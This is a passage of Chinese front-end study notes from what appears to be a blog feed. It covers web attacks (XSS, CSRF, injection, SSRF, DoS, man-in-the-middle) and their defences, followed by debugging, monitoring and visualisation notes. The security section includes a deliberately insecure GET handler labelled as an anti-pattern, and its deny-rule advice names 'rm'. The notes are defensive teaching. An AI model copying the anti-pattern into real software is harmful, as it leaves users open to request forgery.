class="hljs-comment">//create program</span><br><br><span class="hljs-comment">//set points</span><br><span class="hljs-comment">//中心点是坐标原点（0，0）</span><br><br><span class="hljs-comment">//create &amp; build Buffer</span><br><br><span class="hljs-comment">//Frame Buffer to GPU</span><br><br><span class="hljs-comment">//output</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
      <tag>可视化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Web开发安全</title>
    <link href="/2023/03/27/web%E5%BC%80%E5%8F%91%E5%AE%89%E5%85%A8/"/>
    <url>/2023/03/27/web%E5%BC%80%E5%8F%91%E5%AE%89%E5%85%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="Web开发安全"><a href="#Web开发安全" class="headerlink" title="Web开发安全"></a>Web开发安全</h1><h1 id="攻击篇"><a href="#攻击篇" class="headerlink" title="攻击篇"></a>攻击篇</h1><h2 id="一、Cross-site-Scripting-XSS-跨站脚本攻击"><a href="#一、Cross-site-Scripting-XSS-跨站脚本攻击" class="headerlink" title="一、Cross-site Scripting(XSS)跨站脚本攻击"></a>一、Cross-site Scripting(XSS)跨站脚本攻击</h2><h3 id="1-主要利用点"><a href="#1-主要利用点" class="headerlink" title="1.主要利用点"></a>1.主要利用点</h3><ul><li>盲目信任用户的提交内容；</li><li>string-&gt;Dom</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js">doucument.<span class="hljs-property">write</span><br>element.<span class="hljs-property">innerHTML</span>=anyString<br><span class="hljs-title function_">SSR</span>(user_data)<span class="hljs-comment">//伪代码</span><br></code></pre></td></tr></table></figure><h3 id="2-特点"><a href="#2-特点" class="headerlink" title="2.特点"></a>2.特点</h3><ul><li>很难从UI感知；</li><li>窃取用户信息（Cookie/token）；</li><li>绘制UI（例如弹窗），诱骗用户点击/填写表单；</li></ul><p><img src="https://s3.bmp.ovh/imgs/2023/02/06/bab761782d523687.jpg"></p><h3 id="3-类别"><a href="#3-类别" class="headerlink" title="3.类别"></a>3.类别</h3><ul><li>stored XSS（存储型xss）</li></ul><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-恶意脚本被存储在数据库中</span><br><span class="hljs-deletion">-访问页面-&gt;读数据-&gt;被攻击</span><br><span class="hljs-deletion">-危害最大，对全部用户可见</span><br></code></pre></td></tr></table></figure><ul><li>reflected XSS (反射型xss)</li></ul><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-不涉及数据库</span><br><span class="hljs-deletion">-从URL攻击</span><br></code></pre></td></tr></table></figure><p><img src="https://s3.bmp.ovh/imgs/2023/02/06/01aa21181b743218.jpg"></p><ul><li>DOM-based XSS</li></ul><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-不需要服务器参与</span><br><span class="hljs-deletion">-恶意攻击的发起+执行，全部在浏览器完成</span><br></code></pre></td></tr></table></figure><p><img src="https://s3.bmp.ovh/imgs/2023/02/06/8f74704368f2a414.jpg"></p><p><img src="https://s3.bmp.ovh/imgs/2023/02/06/83dda8008e3c1b19.jpg"></p><ul><li>Mutation-based XSS </li></ul><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-利用浏览器渲染DOM的特性（独特优化）</span><br><span class="hljs-deletion">-不同的浏览器，会有区别（按照浏览器进行攻击）</span><br></code></pre></td></tr></table></figure><p><img src="https://s3.bmp.ovh/imgs/2023/02/06/2db16e9e30d05689.jpg"></p><p>Note：其实就是闭合双引号；</p><h2 id="二、Cross-site-request-forgery-CSRF-跨站伪造请求"><a href="#二、Cross-site-request-forgery-CSRF-跨站伪造请求" class="headerlink" title="二、Cross-site request forgery(CSRF)跨站伪造请求"></a>二、Cross-site request forgery(CSRF)跨站伪造请求</h2><h3 id="1-特点"><a href="#1-特点" class="headerlink" title="1.特点"></a>1.特点</h3><ul><li>在用户不知情的前提下</li><li>利用用户权限Cookie</li><li>构造指定HTTP请求，窃取或者修改用户敏感信息</li></ul><p><img src="https://s3.bmp.ovh/imgs/2023/02/06/1cb69b1cdfc1f80f.jpg"></p><h3 id="2-Get请求"><a href="#2-Get请求" class="headerlink" title="2.Get请求"></a>2.Get请求</h3><p><img src="https://s3.bmp.ovh/imgs/2023/02/06/315569b1ad5267c7.jpg"></p><h2 id="三、注入"><a href="#三、注入" class="headerlink" title="三、注入"></a>三、注入</h2><h3 id="1-SQL-Injection"><a href="#1-SQL-Injection" class="headerlink" title="1.SQL Injection"></a>1.SQL Injection</h3><p><img src="https://s3.bmp.ovh/imgs/2023/02/06/bdfe27a1758bff45.jpg"></p><p><img src="https://s3.bmp.ovh/imgs/2023/02/06/d8d8412ddb795269.png"> </p><h3 id="2-更多注入"><a href="#2-更多注入" class="headerlink" title="2.更多注入"></a>2.更多注入</h3><ul><li>CLI</li><li>OS command</li><li>Server-side Request Forgery(SSRF),服务端伪造请求；严格来说并不是注入，但是原理类似；</li></ul><p><img src="https://s3.bmp.ovh/imgs/2023/02/06/c853331fa801b755.jpg"></p><h5 id="读取-修改"><a href="#读取-修改" class="headerlink" title="读取+修改"></a>读取+修改</h5><p><img src="https://s3.bmp.ovh/imgs/2023/02/06/d326f66d918f6e14.jpg"></p><p>SSRF Demo</p><p><img src="https://s3.bmp.ovh/imgs/2023/02/06/730fd31cf9f769ca.jpg"></p><h2 id="四、DOS"><a href="#四、DOS" class="headerlink" title="四、DOS"></a>四、DOS</h2><blockquote><p>通过某种方式（构造特定请求），导致服务器资源被消耗殆尽，来不及响应更多请求，导致请求被挤压，进而形成雪崩效应；</p></blockquote><h3 id="1-正则表达式——贪婪模式"><a href="#1-正则表达式——贪婪模式" class="headerlink" title="1.正则表达式——贪婪模式"></a>1.正则表达式——贪婪模式</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> greedyRegExp=<span class="hljs-regexp">/a+/</span>;<br><span class="hljs-keyword">const</span> noGreedyRegExp=<span class="hljs-regexp">/a+?/</span>;<br><span class="hljs-keyword">const</span> str=<span class="hljs-string">&#x27;aaaaaaa&#x27;</span>;<br><br>result1=str.<span class="hljs-title function_">match</span>(greedyRegExp)[<span class="hljs-number">0</span>];<span class="hljs-comment">// &quot;aaaaaaa&quot;</span><br>result2=str.<span class="hljs-title function_">match</span>(noGreedyRegExp)[<span class="hljs-number">0</span>];<span class="hljs-comment">// &quot;a&quot;</span><br><br></code></pre></td></tr></table></figure><h3 id="2-ReDOS-基于正则表达式的DoS"><a href="#2-ReDOS-基于正则表达式的DoS" class="headerlink" title="2.ReDOS 基于正则表达式的DoS"></a>2.ReDOS 基于正则表达式的DoS</h3><p><img src="https://s3.bmp.ovh/imgs/2023/02/06/c28283945d9c0451.jpg"></p><h3 id="3-DDos"><a href="#3-DDos" class="headerlink" title="3.DDos"></a>3.DDos</h3><blockquote><p>短时间内，来自大量僵尸设备的请求流量，服务器不能及时完成全部请求，导致请求堆积；</p></blockquote><h5 id="Logical-DOS"><a href="#Logical-DOS" class="headerlink" title="Logical DOS"></a>Logical DOS</h5><ul><li>耗时的同步操作</li><li>数据库写入</li><li>SQL join</li><li>文件备份</li><li>循环执行逻辑</li></ul><p><img src="https://s3.bmp.ovh/imgs/2023/02/06/bade294c53a9fd51.jpg"></p><h2 id="五、中间人攻击"><a href="#五、中间人攻击" class="headerlink" title="五、中间人攻击"></a>五、中间人攻击</h2><p><img src="https://pic.imgdb.cn/item/63e069224757feff33a5d839.jpg"></p><h1 id="防御篇"><a href="#防御篇" class="headerlink" title="防御篇"></a>防御篇</h1><h2 id="一、XSS"><a href="#一、XSS" class="headerlink" title="一、XSS"></a>一、XSS</h2><h3 id="1-防御方法"><a href="#1-防御方法" class="headerlink" title="1.防御方法"></a>1.防御方法</h3><h5 id="原则"><a href="#原则" class="headerlink" title="原则"></a>原则</h5><ul><li>永远不要相信用户的提交内容</li><li>永远不要将用户提交的内容转换为DOM</li></ul><h5 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h5><ul><li>主流框架默认防御XSS</li><li>googole-closure-library</li></ul><h5 id="服务端（Node）"><a href="#服务端（Node）" class="headerlink" title="服务端（Node）"></a>服务端（Node）</h5><ul><li>DOMPurify</li></ul><h5 id="业务需要用户生成DOM"><a href="#业务需要用户生成DOM" class="headerlink" title="业务需要用户生成DOM"></a>业务需要用户生成DOM</h5><ul><li>需要对string进行转义</li><li>上传的svg文件需要进行扫描</li><li>Blob动态生成script</li><li>自定义样式（自定义背景图片，url）</li></ul><h3 id="2-同源策略"><a href="#2-同源策略" class="headerlink" title="2.同源策略"></a>2.同源策略</h3><ul><li>协议、域名、端口号完全相同；</li></ul><h3 id="3-CSP（content-security-policy）"><a href="#3-CSP（content-security-policy）" class="headerlink" title="3.CSP（content security policy）"></a>3.CSP（content security policy）</h3><ul><li>那些源认为是安全的</li><li>对来自安全源的脚本可以执行，否则直接抛错</li><li>对eval+inline script 说No！！！！</li></ul><p><img src="https://pic.imgdb.cn/item/63e06b684757feff33a91d70.jpg"></p><h2 id="二、CSRF"><a href="#二、CSRF" class="headerlink" title="二、CSRF"></a>二、CSRF</h2><p><img src="https://pic.imgdb.cn/item/63e06ba14757feff33a96e53.jpg"></p><h5 id="token"><a href="#token" class="headerlink" title="token"></a>token</h5><p><img src="https://pic.imgdb.cn/item/63e06bed4757feff33a9e138.jpg"></p><h5 id="iFrame攻击"><a href="#iFrame攻击" class="headerlink" title="iFrame攻击"></a>iFrame攻击</h5><p><img src="https://pic.imgdb.cn/item/63e06cac4757feff33aaec65.jpg"></p><blockquote><p>button是none的，所以点击button下穿到了底下的iframe页面；</p></blockquote><h5 id="anti-pattern"><a href="#anti-pattern" class="headerlink" title="anti-pattern"></a>anti-pattern</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//GET!==GET+POST</span><br><span class="hljs-comment">//将更新+获取放到同一个GET接口；</span><br>pulic <span class="hljs-keyword">async</span> <span class="hljs-title function_">getAndUpdate</span>(<span class="hljs-params">ctx</span>)&#123;<br>    <span class="hljs-keyword">const</span>&#123;update,id&#125;=ctx.<span class="hljs-property">query</span>;<br>    <span class="hljs-keyword">if</span>(update)&#123;<br>        <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">update</span>(update);<br>    &#125;<br>    ctx.<span class="hljs-property">body</span>=<span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">get</span>(id);<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="避免用户信息被携带：same-site-cookie"><a href="#避免用户信息被携带：same-site-cookie" class="headerlink" title="避免用户信息被携带：same site cookie"></a>避免用户信息被携带：same site cookie</h5><p><img src="https://pic.imgdb.cn/item/63e06e0e4757feff33ad8660.jpg"></p><p><img src="https://pic.imgdb.cn/item/63e06e224757feff33adb6f3.jpg"></p><h5 id="问题：第三方服务依赖于cookie怎么办？"><a href="#问题：第三方服务依赖于cookie怎么办？" class="headerlink" title="问题：第三方服务依赖于cookie怎么办？"></a>问题：第三方服务依赖于cookie怎么办？</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-title class_">Set</span>-<span class="hljs-title class_">Cookie</span><span class="hljs-symbol">:SameSite=None</span>;<span class="hljs-title class_">Secure</span>;<br></code></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/63e06eb34757feff33aec45d.jpg"></p><h2 id="三、Injection"><a href="#三、Injection" class="headerlink" title="三、Injection"></a>三、Injection</h2><ul><li>找到查询SQL的地方</li><li>使用prapared statement</li><li>最小权限原则：禁止sudo || root</li><li>建立允许名单+过滤：禁止rm</li><li>对URL类型参数进行协议、域名、ip等限制：禁止访问内网</li></ul><h2 id="四、DOS-1"><a href="#四、DOS-1" class="headerlink" title="四、DOS"></a>四、DOS</h2><h3 id="1-RegexDos"><a href="#1-RegexDos" class="headerlink" title="1.RegexDos"></a>1.RegexDos</h3><ul><li>code review</li><li>code scan+正则性能测试</li><li>禁止使用用户提供的正则</li></ul><h3 id="2-DDoS"><a href="#2-DDoS" class="headerlink" title="2.DDoS"></a>2.DDoS</h3><ul><li>流量治理：负载均衡、API网关、CDN （过滤）</li><li>快速自动扩容        (抗量)</li><li>非核心服务降级  （抗量）</li></ul><h3 id="3-中间人"><a href="#3-中间人" class="headerlink" title="3.中间人"></a>3.中间人</h3><p><img src="https://pic.imgdb.cn/item/63e070324757feff33b1206f.jpg"></p><ul><li>可靠：加密</li><li>完整：MAC校验</li><li>不可抵赖：数字签名</li></ul><h3 id="4-SRI-子资源集成"><a href="#4-SRI-子资源集成" class="headerlink" title="4.SRI  子资源集成"></a>4.SRI  子资源集成</h3><p>静态资源被劫持篡改？</p><p>对比Hash !!!</p><p><img src="https://pic.imgdb.cn/item/63e071574757feff33b2d91a.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
      <tag>网络安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>前端开发调试</title>
    <link href="/2023/03/27/%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E8%B0%83%E8%AF%95/"/>
    <url>/2023/03/27/%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E8%B0%83%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<h1 id="前端开发调试"><a href="#前端开发调试" class="headerlink" title="前端开发调试"></a>前端开发调试</h1><blockquote><p>No code，no bug</p></blockquote><h2 id="一、Bug-与-Debug"><a href="#一、Bug-与-Debug" class="headerlink" title="一、Bug 与 Debug"></a>一、Bug 与 Debug</h2><h3 id="1-前端Debug的特点"><a href="#1-前端Debug的特点" class="headerlink" title="1.前端Debug的特点"></a>1.前端Debug的特点</h3><ul><li>多平台（浏览器、NodeJS、）</li><li>多环境（本地开发环境，线上环境）</li><li>多工具（Chrome Devtools、Charles、）</li><li>多技巧（Console、Breakpoint、sourceMap、代理等）</li></ul><h2 id="二、桌面端Debug"><a href="#二、桌面端Debug" class="headerlink" title="二、桌面端Debug"></a>二、桌面端Debug</h2><h3 id="1-Chrome-Dev-Tools"><a href="#1-Chrome-Dev-Tools" class="headerlink" title="1. Chrome Dev Tools"></a>1. Chrome Dev Tools</h3><ul><li>动态修改样式</li><li>Console</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">warn</span>(<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">debug</span>(<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">infor</span>(<span class="hljs-string">&quot;&quot;</span>);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">table</span>(<span class="hljs-string">&quot;&quot;</span>)<span class="hljs-comment">//具象化展示JSON和数组数据</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">dir</span>(<span class="hljs-string">&quot;&quot;</span>)<span class="hljs-comment">//通过类似文件树的方式展示对象的属性</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;%s,%o,%c,%d&quot;</span>) <span class="hljs-comment">//占位符：s字符串 o对象 c样式 d数字</span><br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;123&quot;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">123</span>);<span class="hljs-comment">//两者输出颜色不同</span><br></code></pre></td></tr></table></figure><ul><li>source Map</li></ul><p>利用console添加debugger来找出问题在哪里</p><h3 id="2-压缩后的代码如何调试？"><a href="#2-压缩后的代码如何调试？" class="headerlink" title="2.压缩后的代码如何调试？"></a>2.压缩后的代码如何调试？</h3><blockquote><p>前端代码天生具有开源属性，出于安全考虑，上线之前JS代码通常会被压缩，压缩之后的代码只有一行，变量使用a\b等替换，整体变得不可读；</p></blockquote><h5 id="代码压缩工具"><a href="#代码压缩工具" class="headerlink" title="代码压缩工具"></a>代码压缩工具</h5><ul><li>webpack</li><li>Uglify JS</li><li>terser</li></ul><h5 id="线上代码调试"><a href="#线上代码调试" class="headerlink" title="线上代码调试"></a>线上代码调试</h5><ul><li><p>使用source map插件进行映射；</p></li><li><p>mappings字段存储了源文件和source map的映射</p></li><li><p>英文：表示源码及压缩代码的位置关联；</p></li><li><p>逗号：分割一行代码中的内容；</p></li><li><p>分号：代表换行；</p></li></ul><h5 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h5><p>既然source map 可以映射源码，那压缩后的代码带上source map上线不就又不安全了吗？</p><p>答：source map应用场景通常是监控，代码上线的时候是不上source map的，同时也能减少体积；</p><p>项目打包的时候，带上source map一起build，上线之前把source map上传到监控平台，然后删除map的产物，再上传到服务器；然后监控平台如果收集到线上环境的错误，就进行分析，拿错误对照监控平台的map产物，定位错误；</p><h3 id="3-Network"><a href="#3-Network" class="headerlink" title="3. Network"></a>3. Network</h3><ul><li>查看不同网络下页面加载的情况</li><li>文件请求</li><li>网络请求时间，异步同步</li></ul><h3 id="4-Application"><a href="#4-Application" class="headerlink" title="4. Application"></a>4. Application</h3><blockquote><p>存储相关的内容</p></blockquote><ul><li>清理缓存</li><li>查看cookies</li><li>查看会话token等；</li></ul><h3 id="5-Performance"><a href="#5-Performance" class="headerlink" title="5. Performance"></a>5. Performance</h3><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">页面卡顿-&gt;查看FPS指标-&gt;寻找性能瓶颈-&gt;优化代码<br></code></pre></td></tr></table></figure><ul><li>可以查看代码行运行耗费的时间，找到性能瓶颈；</li></ul><h5 id="核心web指标"><a href="#核心web指标" class="headerlink" title="核心web指标"></a>核心web指标</h5><ul><li>LCP（Largest Contentful Paint）：最大内容绘制，测量加载性能；为了提供良好的用户体验，LCP应在页面首次开始加载的2.5s内发生；</li><li>FID（First input Delay）：首次输入延迟，测量交互性；为了用户体验，页面的FID应为100ms甚至更短；</li><li>CLS（Cumulative layout Shift）:累计布局偏移，测量视觉稳定性。应当保持在0.1以下；</li></ul><h2 id="三、移动端Debug"><a href="#三、移动端Debug" class="headerlink" title="三、移动端Debug"></a>三、移动端Debug</h2><h3 id="1-调试方法"><a href="#1-调试方法" class="headerlink" title="1.调试方法"></a>1.调试方法</h3><ul><li>真机调试；</li></ul><p><img src="https://s3.bmp.ovh/imgs/2023/02/05/cd81bc4c19058ed3.jpg"></p><ul><li>VConsole</li></ul><p><img src="https://s3.bmp.ovh/imgs/2023/02/05/c349839e8323843c.jpg"></p><ul><li><p>代理工具（Charles推荐但收费、Progress）</p></li><li><p>NodeJS调试</p></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">//step1<br>node --inspect=8888 index.js<br><br>//step2<br>//chrome浏览器访问<br></code></pre></td></tr></table></figure><ul><li>使用vscode进行调试</li></ul><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">启动调试-&gt;打开网址-&gt;添加断点<br></code></pre></td></tr></table></figure><h2 id="四、前端常用调试方法"><a href="#四、前端常用调试方法" class="headerlink" title="四、前端常用调试方法"></a>四、前端常用调试方法</h2><h3 id="1-线上即时修改-Overrides"><a href="#1-线上即时修改-Overrides" class="headerlink" title="1.线上即时修改 Overrides"></a>1.线上即时修改 Overrides</h3><ul><li>打开Sources面板下的Overrides</li><li>点击Select folders for overrides,选择本地空文件夹</li><li>允许授权</li><li>在page种修改代码，然后保存</li><li>打开devTools,点击右上角的三个小点-&gt;more tools-&gt;changes就能看到所有的修改了</li></ul><h3 id="2-利用代理解决开发阶段的跨域问题"><a href="#2-利用代理解决开发阶段的跨域问题" class="headerlink" title="2.利用代理解决开发阶段的跨域问题"></a>2.利用代理解决开发阶段的跨域问题</h3><p><img src="https://s3.bmp.ovh/imgs/2023/02/05/a8bc42e162606f74.jpg"></p><h5 id="问题-1"><a href="#问题-1" class="headerlink" title="问题"></a>问题</h5><p>为什么使用代理可以解决跨域问题？</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure><ul><li>配置到线上的使用nginx解决跨域问题；</li></ul><h3 id="3-使用代理工具Mock数据"><a href="#3-使用代理工具Mock数据" class="headerlink" title="3.使用代理工具Mock数据"></a>3.使用代理工具Mock数据</h3><p><img src="https://s3.bmp.ovh/imgs/2023/02/05/6174410f7146a1dc.jpg"></p><h3 id="4-小黄鸭调试大法"><a href="#4-小黄鸭调试大法" class="headerlink" title="4.小黄鸭调试大法"></a>4.小黄鸭调试大法</h3><p><img src="https://s3.bmp.ovh/imgs/2023/02/05/55b236ba9e0415bc.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
      <tag>面试笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>前端监控SDK</title>
    <link href="/2023/03/27/%E5%89%8D%E7%AB%AF%E7%9B%91%E6%8E%A7SDK/"/>
    <url>/2023/03/27/%E5%89%8D%E7%AB%AF%E7%9B%91%E6%8E%A7SDK/</url>
    
    <content type="html"><![CDATA[<h1 id="前端监控SDK"><a href="#前端监控SDK" class="headerlink" title="前端监控SDK"></a>前端监控SDK</h1><h2 id="一、为什么要聊前端监控？"><a href="#一、为什么要聊前端监控？" class="headerlink" title="一、为什么要聊前端监控？"></a>一、为什么要聊前端监控？</h2><h3 id="1-经典面试题"><a href="#1-经典面试题" class="headerlink" title="1.经典面试题"></a>1.经典面试题</h3><blockquote><p>Q：在浏览器里，从输入url到页面展示，这中间发生了什么？</p></blockquote><h5 id="浏览网页出现的问题"><a href="#浏览网页出现的问题" class="headerlink" title="浏览网页出现的问题"></a>浏览网页出现的问题</h5><ul><li>打开缓慢（使用的xp+ie，建议升级系统）</li><li>卡顿（电脑配置太差，建议升级硬件）</li><li>图片裂开（用户网络太差，建议升级宽带）</li><li>白屏（在我电脑上没问题啊！！）</li></ul><blockquote><p>前端监控通过对页面数据的采集和上报，来帮助开发者更快速的对质量差的页面进行分析与归因；</p></blockquote><h5 id="监控页面质量的意义"><a href="#监控页面质量的意义" class="headerlink" title="监控页面质量的意义"></a>监控页面质量的意义</h5><ul><li>减少等待时间，提升流量和注册量</li><li>减少加载时间，转化率提升、跳出率降低</li></ul><h3 id="2-前端监控内容"><a href="#2-前端监控内容" class="headerlink" title="2.前端监控内容"></a>2.前端监控内容</h3><ul><li>性能指标</li><li>异常事件</li></ul><p><img src="https://s3.bmp.ovh/imgs/2023/02/07/b036f881035999c6.jpg"></p><h2 id="二、常用性能指标"><a href="#二、常用性能指标" class="headerlink" title="二、常用性能指标"></a>二、常用性能指标</h2><h3 id="1-以用户为中心的性能指标"><a href="#1-以用户为中心的性能指标" class="headerlink" title="1.以用户为中心的性能指标"></a>1.以用户为中心的性能指标</h3><p><img src="https://s3.bmp.ovh/imgs/2023/02/07/6bc30cec8a9bb5f3.jpg"></p><ul><li><p>FP：首次渲染的时间点，FP时间点之前，用户看到的都是空白的白屏；</p></li><li><p>FCP：首次有内容渲染的时间点；</p></li><li><p>FMP：首次绘制有意义内容的时间点；</p></li><li><p>TTI：测量页面从开始加载到主要子资源完成渲染并能够快速可靠的响应用户输入所需的时间。TTI越小用户能越早交互；</p></li><li><p>SI（Speed Index）：衡量页面可视区域加载速度；</p></li></ul><p><img src="https://s3.bmp.ovh/imgs/2023/02/07/5b5921ad1952f52a.jpg"></p><blockquote><p>A和B的首次内容出现和加载时间完全一样，但是A的用户体验更好；</p></blockquote><ul><li><p>FID（First Input Delay）：测量从用户第一次与页面交互（点击、按钮）知道浏览器对交互做出响应实际能够处理事件时所经过的时间；</p></li><li><p>LCP（Largest Contentful Paint）：最大的内容在可视区域内变得可见的时间点；</p></li></ul><p>优点：1.容易理解 2.给出结果与FMP结果相似 3.容易计算和上报</p><ul><li>TBT（Total Blocking TIme）：量化主线程在空闲之前的繁忙程度，有助于理解在加载是啊金，页面无法响应用户输入的时间有多久；</li></ul><p><img src="https://s3.bmp.ovh/imgs/2023/02/07/d6ec168427ced5ef.jpg"></p><p>长任务：如果一个任务在主线程上运行超过50ms，就是长任务</p><ul><li>CLS（Cumulative Layout Shift）：量化了 在页面加载期间，视口内元素的移动程度；-</li></ul><p>点击按钮的时候，页面突然出现了内容或者文本下移等类似的问题，对用户操作产生影响；</p><h2 id="三、前端常见异常"><a href="#三、前端常见异常" class="headerlink" title="三、前端常见异常"></a>三、前端常见异常</h2><h3 id="1-静态资源错误"><a href="#1-静态资源错误" class="headerlink" title="1.静态资源错误"></a>1.静态资源错误</h3><blockquote><p>所需要的html、css、js以及图片等其他多媒体文件；</p><p>静态资源错误：在拉取和加载静态资源的过程中发生了预期之外的错误，如网络异常等；</p></blockquote><h3 id="2-请求异常"><a href="#2-请求异常" class="headerlink" title="2.请求异常"></a>2.请求异常</h3><ul><li>100-199（信息响应）</li><li>200-299（成功响应）</li><li>300-399（重定向）</li><li>400-499（客户端错误）</li><li>500-599（服务端错误）</li></ul><p>请求异常=请求响应状态码&gt;=400;</p><p>对于异步请求拉取的静态资源错误也可以选择归纳为请求异常；</p><p>状态码为0：</p><p><img src="https://s3.bmp.ovh/imgs/2023/02/07/f4b5b3dc5ffd4542.jpg"></p><h3 id="3-js错误"><a href="#3-js错误" class="headerlink" title="3. js错误"></a>3. js错误</h3><p>js错误会严重影响页面的正常渲染与交互，是前端监控的重点；</p><h3 id="4-白屏异常"><a href="#4-白屏异常" class="headerlink" title="4.白屏异常"></a>4.白屏异常</h3><p>通常可以通过判断DOM树的结构来粗略判断白屏是否发生；</p><ul><li>js错误导致关键资源渲染失败</li><li>请求异常</li><li>长时间的js线程繁忙阻塞渲染任务</li></ul><h2 id="四、性能指标监控"><a href="#四、性能指标监控" class="headerlink" title="四、性能指标监控"></a>四、性能指标监控</h2><h3 id="1-Perfomance"><a href="#1-Perfomance" class="headerlink" title="1.Perfomance"></a>1.Perfomance</h3><p>Web Api接口；</p><p>Performance Observer；</p>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
      <tag>面试笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数据可视化</title>
    <link href="/2023/03/27/%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96%E5%9F%BA%E7%A1%80/"/>
    <url>/2023/03/27/%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="数据可视化"><a href="#数据可视化" class="headerlink" title="数据可视化"></a>数据可视化</h1><h2 id="一、什么是数据可视化？"><a href="#一、什么是数据可视化？" class="headerlink" title="一、什么是数据可视化？"></a>一、什么是数据可视化？</h2><blockquote><p>Anything that converts data into a visual representation. </p><p>Charts\Graphs\Maps\Tables…</p></blockquote><h3 id="1-数据可视化分类"><a href="#1-数据可视化分类" class="headerlink" title="1.数据可视化分类"></a>1.数据可视化分类</h3><ul><li>科学可视化：科学实验数据的直观展示；</li><li>信息可视化：对抽象数据的直观展示；</li><li>可视分析：对分析结果的直观展示，及交互式反馈，跨学科；</li></ul><h3 id="2-为社么需要数据可视化？"><a href="#2-为社么需要数据可视化？" class="headerlink" title="2.为社么需要数据可视化？"></a>2.为社么需要数据可视化？</h3><ul><li>记录信息；</li><li>分析推理；</li><li>证实假设；</li><li>交流思想；</li></ul><h2 id="二、可视化设计原则和方法"><a href="#二、可视化设计原则和方法" class="headerlink" title="二、可视化设计原则和方法"></a>二、可视化设计原则和方法</h2><ul><li>糟糕的可视化</li></ul><p><img 